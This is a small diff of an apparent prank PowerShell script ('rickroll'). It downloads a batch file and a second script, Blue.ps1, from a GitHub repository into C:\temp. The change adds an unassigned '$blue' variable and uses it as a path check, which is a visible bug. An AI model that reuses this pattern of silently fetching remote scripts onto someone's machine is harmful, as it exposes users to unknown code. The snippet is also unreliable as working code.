@@ -1,5 +1,6 @@
 $filename = "C:\temp\rickroll.jpg"
 $bat = 'C:\temp\lobster.bat'
+$blue
 
 #If the file does not exist, create it.
 if (-not(Test-Path -Path $filename -PathType Leaf)) {
@@ -25,7 +26,7 @@ namespace Win32{
 if (-not(Test-Path -Path $bat -PathType Leaf)) {
    Invoke-WebRequest -Uri https://github.com/CHONK12/rickRoll/raw/main/Lobster.bat -OutFile C:\temp\lobster.bat
 }
-if (-not(Test-Path -Path $bat -PathType Leaf)) {
+if (-not(Test-Path -Path $blue -PathType Leaf)) {
    Invoke-WebRequest -Uri https://github.com/CHONK12/rickRoll/raw/main/Blue.ps1 -OutFile C:\temp\Blue.ps1
 }
 if ((Test-Path -Path $filename -PathType Leaf)) {
